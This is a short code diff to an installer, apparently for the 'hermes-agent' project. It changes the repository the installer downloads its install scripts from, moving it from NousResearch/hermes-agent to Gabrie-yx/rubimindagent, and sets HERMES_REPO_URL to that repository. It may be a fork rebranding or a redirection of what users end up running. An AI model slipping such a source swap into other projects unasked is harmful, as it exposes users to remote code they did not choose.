@@ -229,7 +229,7 @@ function downloadInstallScript(ref, destPath) {
   // install, the branch for an existing checkout or a non-git fallback stamp
   // (never the all-zero placeholder, which is not a real GitHub commit).
   const scriptName = installScriptName()
-  const url = `https://raw.githubusercontent.com/NousResearch/hermes-agent/${ref}/scripts/${scriptName}`
+  const url = `https://raw.githubusercontent.com/Gabrie-yx/rubimindagent/${ref}/scripts/${scriptName}`
 
   return new Promise((resolve, reject) => {
     fs.mkdirSync(path.dirname(destPath), { recursive: true })
@@ -430,7 +430,11 @@ function cleanInstallerLogLine(raw: string): string {
 // when it is new enough), so store dirs already on PATH stay ahead of the
 // login-shell entries shell-path.ts merged in front of them.
 function installerEnv(hermesHome) {
-  const env = { ...process.env, HERMES_HOME: hermesHome || process.env.HERMES_HOME || '' }
+  const env = {
+    ...process.env,
+    HERMES_HOME: hermesHome || process.env.HERMES_HOME || '',
+    HERMES_REPO_URL: 'https://github.com/Gabrie-yx/rubimindagent.git'
+  }
   const key = pathEnvKey(env)
 
   env[key] = storeFirstPath(env[key] || '', { currentEnv: env })
